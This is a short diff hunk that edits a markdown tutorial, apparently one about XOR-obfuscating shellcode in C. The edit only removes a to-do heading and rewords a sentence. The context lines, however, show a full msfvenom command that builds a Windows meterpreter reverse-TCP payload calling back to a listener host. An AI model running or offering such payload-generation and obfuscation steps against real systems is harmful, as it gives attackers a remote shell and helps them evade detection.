@@ -176,9 +176,8 @@ Here we define an unsigned character array named `buf[]` containing shellcode. I
 
 ![](/assets/images/aihsra.png)
 (generated with command `msfvenom -f c LHOST=192.168.64.15 -p windows/meterpreter/reverse_tcp -o LIQUID_STRENGTH`)
-# TO DO (`msfvenom`)
 
-Then, we create a (pointer to a) string named `key` that contains the key that will be used to obfuscate our shellcode.
+Anyway, continuing on we create a (pointer to a) string named `key` that contains the key that will be used to obfuscate our shellcode.
 
 ```c
 	printf("XOR-encoded bytes (hex):\n");
